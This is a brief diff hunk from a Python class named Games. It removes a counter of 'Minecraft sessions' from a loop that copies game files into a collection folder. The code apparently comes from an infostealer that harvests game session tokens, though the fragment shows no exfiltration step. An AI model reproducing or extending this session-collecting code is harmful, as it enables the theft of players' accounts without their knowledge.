@@ -67,6 +67,5 @@ class Games:
                 try:
                     os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
                     shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
-                    self.MinecraftSessions += 1
                 except Exception:
                     continue
